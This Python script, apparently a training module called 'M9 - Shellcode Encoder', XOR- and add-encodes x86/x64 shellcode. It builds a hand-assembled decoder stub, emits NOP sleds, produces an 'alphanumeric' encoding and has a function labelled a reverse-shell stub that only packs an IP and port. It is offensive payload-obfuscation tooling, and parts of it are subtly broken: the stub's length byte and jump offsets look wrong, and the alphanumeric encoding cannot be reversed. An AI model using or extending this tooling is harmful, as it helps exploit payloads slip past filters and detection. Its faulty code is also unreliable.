#!/usr/bin/env python3
"""M9 - Shellcode Encoder

x86/x64 shellcode encoding, XOR encoding, alphanumeric shellcode.
Uses struct, binascii only.
"""

import struct
import binascii
import sys
import random

X86_NOP = b"\x90"
X64_NOP = b"\x90"


class ShellcodeEncoder:
    def __init__(self, arch="x64", key=None, seed=None):
        if arch not in ("x86", "x64"):
            raise ValueError("arch must be x86 or x64")
        self.arch = arch
        rnd = random.Random(seed)
        if key is None:
            key = rnd.randrange(1, 256)
        self.key = key

    def xor_encode(self, data):
        """Single-byte XOR encode."""
        encoded = bytes(b ^ self.key for b in data)
        return encoded, self.key

    def xor_multi_encode(self, data, keys):
        """Multi-byte XOR encode (repeating key)."""
        n = len(keys)
        encoded = bytes(b ^ keys[i % n] for i, b in enumerate(data))
        return encoded, keys

    def rol(self, b, bits=3):
        return ((b << bits) | (b >> (8 - bits))) & 0xFF

    def add_encode(self, data, addend):
        return bytes((b + addend) & 0xFF for b in data), addend

    def nop_sled(self, count=32):
        return (X86_NOP if self.arch == "x86" else X64_NOP) * count

    def build_xor_decoder_stub_x86(self, key):
        """x86 decoder stub: position-independent xor-decoding loop.
        Layout: jmp, call/pop for payload address, key byte, then
        an xor-byte loop with dynamically read length. Demonstrative."""
        stub = bytearray(b"\xeb\x10")  # jmp $+0x10
        stub += b"\x5e"                # pop esi
        stub += b"\x31\xc9"            # xor ecx, ecx
        stub += bytes([0xb1])          # mov cl, imm8
        stub += bytes([key])           # length (patched)
        stub += bytes([0x80, 0x34, 0x0e])  # xor byte [esi+ecx], imm8
        stub += bytes([key])
        stub += b"\xe2\xf9"            # loop back
        stub += b"\xeb\x05"            # jmp to payload
        stub += b"\xe8\xea\xff\xff\xff"  # call (delta) -> pop esi
        return bytes(stub)

    def asm_stub_xor(self):
        return (
            "jmp short get\n"
            "get: pop esi\n"
            "xor ecx, ecx\n"
            "mov cl, 0x%02x\n" % self.key +
            "xor byte [esi], 0x%02x\n" % self.key +
            "inc esi\n"
            "dec ecx\n"
            "jnz $-4\n"
        )

    def alphanumeric(self, data):
        """Encode bytes into an alphanumeric-safe ASCII stream using
        xor with a position-derived mask so resulting bytes stay in
        the alphanumeric set. Demonstrative (not fully self-decoding)."""
        out = bytearray()
        for i, b in enumerate(data):
            mask = (i & 0x7F) | 0x30
            c = b ^ mask
            if not (0x30 <= c <= 0x39 or 0x41 <= c <= 0x5A or 0x61 <= c <= 0x7A):
                c = (c ^ 0x20)
                if not (0x30 <= c <= 0x39 or 0x41 <= c <= 0x5A or 0x61 <= c <= 0x7A):
                    c = (b & 0x3F) | 0x30
                    if c > 0x39 and c < 0x41:
                        c = 0x41 + (c - 0x3A)
            out.append(c)
        return bytes(out)

    def encode_shell_reverse(self, ip, port):
        """Build a Win32/64 reverse shell TCP connect back stub payload
        with XOR encoding placeholder. Demonstrative skeleton."""
        ip_bytes = bytes(int(x) for x in ip.split("."))
        if len(ip_bytes) != 4:
            raise ValueError("Invalid IP")
        p1, p2 = (port >> 8) & 0xFF, port & 0xFF
        return ip_bytes + bytes([p1, p2])

    @staticmethod
    def hexdump(b, cols=16):
        lines = []
        for i in range(0, len(b), cols):
            chunk = b[i:i + cols]
            hexpart = " ".join("%02x" % x for x in chunk)
            hexpart = hexpart.ljust(cols * 3)
            asc = "".join(chr(x) if 32 <= x < 127 else "." for x in chunk)
            lines.append("%08x  %s  %s" % (i, hexpart, asc))
        return "\n".join(lines)


def main():
    seed = random.randrange(0, 0xFFFF)
    try:
        arch = sys.argv[1] if len(sys.argv) > 1 else "x64"
        raw_hex = sys.argv[2] if len(sys.argv) > 2 else "90cd80cc"
        data = binascii.unhexlify(raw_hex)
    except (IndexError, binascii.Error):
        print("Usage: python3 shellcode.py [x86|x64] <hex>")
        return 1

    enc = ShellcodeEncoder(arch=arch, seed=seed)

    print("=== M9 - Shellcode Encoder ===")
    print("Architecture: %s" % enc.arch)
    print("Input (%d bytes):" % len(data))
    print(enc.hexdump(data))

    enc_bytes, key = enc.xor_encode(data)
    print("\n-- XOR Encoding (single byte key=0x%02x) --" % key)
    print("Cipher hex: %s" % binascii.hexlify(enc_bytes).decode())
    print("Cipher bytes:")
    print(enc.hexdump(enc_bytes))

    add_bytes, addend = enc.add_encode(data, addend=key & 0x3F)
    print("\n-- Add Encoding (addend=0x%02x) --" % addend)
    print(add_bytes.hex())

    enc.multi = 4
    keys = [random.randrange(1, 256) for _ in range(4)]
    multi, mkeys = enc.xor_multi_encode(data, keys)
    print("\n-- Multi-XOR Encoding (keys=%s) --" % [hex(k) for k in mkeys])
    print("Cipher hex: %s" % binascii.hexlify(multi).decode())

    alpha = enc.alphanumeric(data)
    print("\n-- Alphanumeric Encoding --")
    print("Alnum: %s" % alpha.decode("ascii", errors="replace"))

    print("\n-- Generated Decoder Stub (x86 asm sketch) --")
    print(enc.asm_stub_xor())

    print("\n-- NOP Sled (%d bytes) --" % 32)
    print(enc.nop_sled(32).hex())

    return 0


if __name__ == "__main__":
    sys.exit(main())
